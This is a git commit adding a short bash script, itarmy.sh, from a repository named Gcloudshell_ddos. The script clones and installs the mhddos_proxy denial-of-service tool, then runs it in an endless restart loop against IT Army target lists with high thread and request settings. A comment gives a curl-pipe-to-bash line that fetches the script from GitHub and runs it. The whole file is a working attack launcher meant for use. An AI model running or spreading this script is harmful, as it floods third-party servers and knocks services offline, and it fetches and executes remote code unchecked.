0cb7269f950a4740531acb42e620674342e282a1
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-27 15:58:06 +0300

    Create itarmy.sh

---
+++ itarmy.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/itarmy.sh | bash
+rm -rf mhddos_proxy
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+while true
+do
+   pkill -f runner.py
+   sleep 5
+   python3 runner.py --itarmy -t 1000 --rpc 500 --debug
+sleep 9m
+done
